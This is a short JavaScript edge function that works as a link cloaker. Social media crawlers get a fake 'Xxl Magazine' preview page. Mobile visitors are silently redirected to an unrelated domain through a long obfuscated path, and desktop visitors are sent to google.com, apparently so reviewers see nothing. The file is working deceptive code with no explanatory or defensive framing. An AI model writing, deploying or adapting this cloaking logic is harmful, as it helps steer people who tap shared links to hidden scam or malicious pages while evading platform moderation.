export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="Xxl Magazine">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Tue-Sep-08-2026/ec4b39a8-1202-4276-b66d-3db17750d2a6/471393fa-7d6a-41fd-9eda-a1a1cb6ff1c2.avif">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://racialburgerdiverse.com/a6g/Lmmhytfxfj6l58Iqt_/nwCmZ6O1pOlLauJi2MVO/aVG89PN8oTmLaqMlSv4x/wDCToQYHH16pVGrYNu2/fwN9M3w07NN_XApwB/UER/VqI_Ubgt_Abh4g_8k5d/5Rcl8gPwDi", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
